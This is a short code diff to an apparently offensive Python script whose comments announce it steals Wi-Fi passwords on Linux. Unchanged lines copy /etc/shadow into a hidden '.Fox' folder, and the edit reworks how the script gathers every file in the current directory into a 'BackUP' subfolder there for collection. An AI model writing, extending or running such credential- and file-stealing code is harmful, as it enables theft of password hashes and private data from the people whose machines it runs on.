@@ -1,4 +1,5 @@
 import os
+from os import walk
 import shutil
 
 ### Steal WIFI Password On Linux ###
@@ -15,8 +16,9 @@ os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")
 
 ### Take Backup ###
 os.mkdir(".Fox/BackUP")
-data = os.listdir(".")
+data = []
+for (dirpath, dirnames, filenames) in walk("."):
+    data.extend(filenames)
+    break
 for file in data:
-    if file == ".Fox":
-        continue
     shutil.copy2(file, ".Fox/BackUP")
